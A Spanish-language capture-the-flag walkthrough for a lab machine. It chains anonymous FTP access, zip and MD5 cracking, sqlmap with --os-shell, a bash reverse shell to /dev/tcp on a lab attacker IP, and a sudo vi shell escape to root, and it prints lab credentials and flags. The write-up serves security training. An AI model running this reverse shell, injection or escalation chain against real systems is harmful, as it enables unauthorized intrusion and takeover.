@@ -1,0 +1,158 @@
+INiciamos con el escaneo de puertos y en este nos adamos cuenta que tenemos 3 servicios expuestos
+
+{
+	ssh : 22
+	ftp : 21 -> tenemos acceso como anonymo
+	http : 80 -> panel login
+}
+
+luego de esto accedemos al puerto ftp ingresamos usuario y cualquier contraseña luego vemos que tenemos un archivo backup.zip
+{
+	con_ftp : {
+		commands :{
+			ftp $IP_HOST,
+			Username: anonymous,
+			password : random
+			dir : {
+				output : backup.zip 
+				}
+			}
+			get backup.zip
+		}
+	
+}
+
+al executar estos commandos nos salimos del servicio y tratamos de unzipear el archivo pero este tiene contraseñas.
+
+para esto podremos utilizar john the ripper, mas sin embargo primero tendremos que convertir el archivo zip a un formato 
+
+que john entienda.
+
+{
+	john : {
+		zip2john backup.zip > hash
+		john -wordlist=/usr/share/wordlist/rockyou.txt : {
+				output : {
+					pass : 741852963
+				}
+			}
+	}
+}
+
+ya que obtuvimus la contraseña del archivo procedemos a descomprimirlo
+
+{
+	unzip backup.zip
+	pass : 741852963
+}
+
+observamos que hay dentro del archivo php y obtuvimos esta salida
+
+{
+	<?php
+	session_start();
+	  if(isset($_POST['username']) && isset($_POST['password'])) {
+	    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+	      $_SESSION['login'] = "true";
+	      header("Location: dashboard.php");
+	    }
+	  }
+	?>	
+}
+
+{
+	username : admin,
+	password : 2cb42f8734ea607eefed3b70af13bbd3
+}
+
+al ver este hash que hay para la contraseña de inmediato sabemos que es md5, procedemos a romperlo con ayuda
+de crackstation
+{
+	user : admin
+	pass_md5 : 2cb42f8734ea607eefed3b70af13bbd3, 
+	pass : qwerty789
+}
+
+ahora podremos ingresar a el dashboard
+
+ahora ya que tenemos nuestra cookie de session admin y entramos vemos que tenemos unos datos que estan enrolados a una db
+y pueden ser traidos por un input, al enviar nuestro query en la url se ve reflejado un posible sql inyecttion
+
+para esto utilizaremos sqlmap que nos ayudara a saber si el sitio tiene o no vulnerabilidades de inyection
+
+
+{
+	sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --cookie 'PHPSESSID=cu8te1hntl47luef7e2q9a18dh'  --os-shell
+}
+
+ESte comando nos dira las vulns del sitio y si este es vulnerable a sql injection utilizaremos la flag --os-shell para obtener 
+una shell algo interactiva
+
+Como el sitio si lo es procedemos a ejecutar nuestra reverse shell para haci poder obtener acceso al sistema
+
+{
+	atacatante : {
+		cmd : nc -lvp 443
+		description: esto sera para ponernos en escucha por el puerto y recibir coneciones
+	}
+	servidor : {
+		cmd : bash -c "bash -i >& /dev/tcp/10.10.16.56/443 0>&1"
+	}
+	con esto deberiamos de obtener una shell como postgresql user
+}
+
+capturamos la flag 
+
+{
+	flag_user : "ec9b13ca4d6229cd5cc1e09980965bf7"
+}
+
+Luego de obtener la flag tenemos que escalar privilegios y para eso utilizaremos sudo -l
+
+accedemos a la ruta de la aplicasion y vemos que el archivo dashboard tiene lo siguiente
+
+{
+        $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+	
+	Obtenemos mas credenciales 
+}
+
+entramos ahora por ssh para no tener problemas con la terminal
+ingresamos y ejecutamos sudo -L
+
+{
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+}
+
+ejecutamos  sudo vi -c ':!/bin/sh' /dev/null y observamos que no podemos hacer nada aun
+luego vamos a abrir vim
+{
+	vi : {
+		:set shell=/bin/sh
+		:shell
+	}
+
+}
+CON ESTAS DOS LINEAS TENDREMOS NUESTRA SHELL YA SETEADA EN VI
+
+ahora pasamos a hacerlo como root, 
+
+{
+	sudo /bin/vi /etc/postgresql/11/main/pb_hba.conf 
+}
+
+Esto abrira el archivo como root
+
+Seteamos de nnuevo nuestra shell en vi
+
+{
+        vi : {
+                :set shell=/bin/sh
+                :shell
+        }
+
+}
+
+Y ahora ya somos root obtenemos la flag y a tomar por el culo
+
